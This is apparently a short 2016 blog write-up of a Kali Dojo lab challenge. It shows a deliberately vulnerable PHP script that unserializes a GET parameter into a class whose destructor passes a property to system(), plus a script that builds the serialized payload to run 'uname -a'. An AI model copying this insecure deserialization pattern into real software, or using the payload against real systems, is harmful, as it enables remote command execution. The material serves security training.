---
layout: post
title:  "Kali Dojo :: PHP Object Challenge"
date:   2016-09-14
---

![001](/img/tryharder-php-object/try-harder-001.png)

![002](/img/tryharder-php-object/try-harder-002.png)

tryharder.php

```php
<?php

class TryHarder {
	public $cmd=null;
	public function __destruct() {
		system($this->cmd);
	}
}

$offsec = unserialize($_GET['os']);

?>
```

go.php

```php
<?php

class TryHarder {
    public $cmd=null;
}

$o = new TryHarder();
$o->cmd = 'uname -a';
print urlencode(serialize($o));

?>
```

![003](/img/tryharder-php-object/try-harder-003.png)